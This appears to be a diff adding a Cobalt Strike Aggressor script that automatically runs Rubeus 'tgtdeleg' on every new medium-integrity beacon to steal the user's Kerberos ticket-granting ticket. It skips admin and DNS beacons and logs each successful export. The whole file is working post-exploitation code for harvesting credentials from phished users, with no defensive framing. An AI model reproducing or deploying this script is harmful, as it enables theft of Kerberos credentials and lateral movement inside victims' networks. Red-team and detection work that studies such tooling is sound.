@@ -1,0 +1,57 @@
+# NOTE: This script works best when SaveTicket.cna is also loaded.
+$RUBEUSLOCATION = "/opt/Rubeus.exe"; # location of Rubeus.exe
+
+global('@exportedUsers');
+@exportedUsers = @();
+
+on beacon_initial {
+    $username = binfo($1, "user");
+    $hostname = binfo($1, "computer");
+    $dnsCheck = binfo($1, "external");
+
+    # This will force Cobalt Strike to only grab user's TGT if beacon is in medium-integrity context.  This is to seperate out phished user beacons from lateral movement beacons.
+    if ( -isadmin $1 )
+    {
+        println("\nHost: $hostname");
+        println("User: $username");
+        println("Result: skipping because beacon is in Administrative Context");
+    }
+    # this will force Cobalt Strike to only grab users's TGT once, helpful if spawning new beacons as that user.  Comment out if you need to grab TGT EVERYTIME beacon comes in.
+    else if ( $username in @exportedUsers )
+    {
+        println("\nHost: $hostname");
+        println("User: $username");
+        println("Result: skipping because user's TGT has already been Exported.");
+    }
+    # skip grabbing TGT for DNS beacons 
+    else if ( $dnsCheck eq '' )
+    {
+        println("\nHost: $hostname");
+        println("User: $username");
+        println("Result: skipping because likely DNS beacon based on reported external IP address.");
+    } 
+    else
+    {
+        bexecute_assembly($1, $RUBEUSLOCATION, "tgtdeleg");
+    }
+}
+
+on beacon_output {
+    $beaconOutput = replace($2, "received output:\n", "");
+    $exportTGTsuccess = "[+] Successfully decrypted the authenticator";
+
+    # grab beacon metadata for event logging
+    $username = binfo($1, "user");
+    $pid = binfo($1, "pid");
+    $hostname = binfo($1, "computer");
+
+    if ( $exportTGTsuccess isin $beaconOutput )
+    {
+        println("\nHost: $hostname");
+        println("User: $username");
+        println("Result: Successfully exported TGT for $username"); 
+        elog("[!] Exported TGT on host $hostname for $username"); 
+
+        add(@exportedUsers, $username);
+    }
+}
